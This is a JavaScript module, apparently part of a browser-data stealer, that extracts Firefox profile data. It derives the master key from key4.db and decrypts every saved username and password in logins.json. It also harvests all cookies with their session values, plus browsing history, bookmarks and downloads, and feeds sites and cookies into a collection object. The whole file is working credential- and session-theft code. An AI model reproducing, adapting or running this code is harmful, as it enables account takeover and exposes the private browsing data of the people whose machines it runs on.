const fs = require("fs");
const path = require("path");
const iconv = require("iconv-lite");

const structures = require("./structures");
const cryptofy = require('./cryptofy.js');
const query = require("./query.js");

class Gecko {
    decrypt = (encryptedPass, masterKey) => {
        const decryptedData = cryptofy.decryptedData(
            cryptofy.decodeB64ASN1Data(encryptedPass).data,
            cryptofy.decodeB64ASN1Data(encryptedPass).iv,
            masterKey,
            "3DES-CBC"
        );

        const decryptedString = iconv.encode(decryptedData.data, "latin1").toString();

        return decryptedString;
    };

    GetMasterKey = async (geckoPathProfile, masterPassword) => {
        const keyDbFilePath = path.join(geckoPathProfile, 'key4.db');
        if (!fs.existsSync(keyDbFilePath)) return null;

        const masterPasswordBytes = cryptofy.stringToUtf8ByteString(masterPassword);

        const sqliteQuery = new query.SqliteQuery(keyDbFilePath);

        try {
            const metaDataRows = await sqliteQuery.execute('SELECT item1, item2 FROM metadata WHERE id = "password";');
            if (!metaDataRows || !metaDataRows.length) return;

            const globalSalt = cryptofy.bufferToByteString(metaDataRows[0].item1.buffer);

            const encryptedItem2 = cryptofy.bufferToByteString(metaDataRows[0].item2.buffer);
            const decryptedItem2 = cryptofy.decryptWithPBES(encryptedItem2, masterPasswordBytes, globalSalt);
            if (!decryptedItem2 || decryptedItem2.data !== 'password-check') throw new Error('Incorrect master password.');

            const nssPrivateRows = await sqliteQuery.execute('SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;');
            if (!nssPrivateRows || !nssPrivateRows.length) return;

            const encryptedA11 = cryptofy.bufferToByteString(nssPrivateRows[0].a11.buffer);
            const decryptedKeyPBES = cryptofy.decryptWithPBES(encryptedA11, masterPasswordBytes, globalSalt);

            return decryptedKeyPBES;
        } catch (error) {
            return null;
        }
    };

    GetDownloads = async (geckoPathProfile) => {
        const PlacesDbFilePath = path.join(geckoPathProfile, 'places.sqlite');
        if (!fs.existsSync(PlacesDbFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(PlacesDbFilePath);

        try {
            const rows = await sqliteQuery.execute('SELECT GROUP_CONCAT(content) AS content, url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id = moz_places.id) t GROUP BY place_id');

            return rows.map(({ content, url }) => {
                const objectRegex = /,(.*)/;
                const fileRegex = /file:\/\/\/(.*?),/;

                const objectMatch = objectRegex.exec(content);
                const fileMatch = fileRegex.exec(content);

                if (fileMatch && objectMatch) {
                    let parsedJson;
                    try {
                        parsedJson = JSON.parse(objectMatch[1]);
                    } catch (error) {
                        return null;
                    };

                    return new structures.Download(
                        url,
                        fileMatch[1],
                        parsedJson?.fileSize
                    );
                }
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetHistorys = async (geckoPathProfile) => {
        const PlacesDbFilePath = path.join(geckoPathProfile, 'places.sqlite');
        if (!fs.existsSync(PlacesDbFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(PlacesDbFilePath);

        try {
            const rows = await sqliteQuery.execute('SELECT * FROM moz_places where title not null');

            return rows.map(({ url, title, visit_count, last_visit_date }) => {
                return new structures.History(
                    url,
                    title,
                    visit_count,
                    last_visit_date
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetBookmarks = async (geckoPathProfile) => {
        const PlacesDbFilePath = path.join(geckoPathProfile, 'places.sqlite');
        if (!fs.existsSync(PlacesDbFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(PlacesDbFilePath);

        try {
            const rows = await sqliteQuery.execute('SELECT * FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)');

            return rows.map(({ url, title, dateAdded }) => {
                return new structures.Bookmark(
                    url,
                    title,
                    dateAdded
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetLogins = async (geckoPathProfile, MasterKey) => {
        const LoginsFilePath = path.join(geckoPathProfile, "logins.json");
        if (!fs.existsSync(LoginsFilePath)) return [];

        const LoginsFileTempPath = path.join(geckoPathProfile, 'logins.temp.json');

        try {
            fs.copyFileSync(LoginsFilePath, LoginsFileTempPath);
            const loginsObjectJson = JSON.parse(fs.readFileSync(LoginsFileTempPath, "utf8"));

            return loginsObjectJson?.logins.map(({ encryptedUsername, encryptedPassword, hostname, timeLastUsed }) => {

                const decryptedUser = this.decrypt(encryptedUsername, MasterKey);
                const decryptedPass = this.decrypt(encryptedPassword, MasterKey);

                if (decryptedUser && decryptedPass) {
                    structures.BrowserStatistics.addSites({
                        source: 'logins',
                        origin_url: hostname
                    });

                    return new structures.Login(
                        hostname,
                        decryptedUser,
                        decryptedPass,
                        timeLastUsed
                    )
                };
            }).filter(Boolean);
        } catch (error) {
            return [];
        } finally {
            if (fs.existsSync(LoginsFileTempPath)) {
                try {
                    fs.unlinkSync(LoginsFileTempPath);
                } catch (error) {
                }
            }
        }
    };

    GetCookies = async (geckoPathProfile) => {
        const CookieFilePath = path.join(geckoPathProfile, 'cookies.sqlite');
        if (!fs.existsSync(CookieFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(CookieFilePath);

        try {
            const rows = await sqliteQuery.execute('SELECT * FROM moz_cookies');

            return rows.map(({ host, path, isSecure, expiry, name, value }) => {
                structures.BrowserStatistics.addSites({
                    source: 'cookies',
                    origin_url: host
                });

                structures.BrowserStatistics.addCookies({
                    host_key: host,
                    path: path,
                    is_secure: isSecure,
                    expires_utc: expiry,
                    name: name,
                    value: value
                });

                return new structures.Cookie(
                    host,
                    path,
                    isSecure,
                    expiry,
                    name,
                    value
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };
}

module.exports = {
    Gecko
}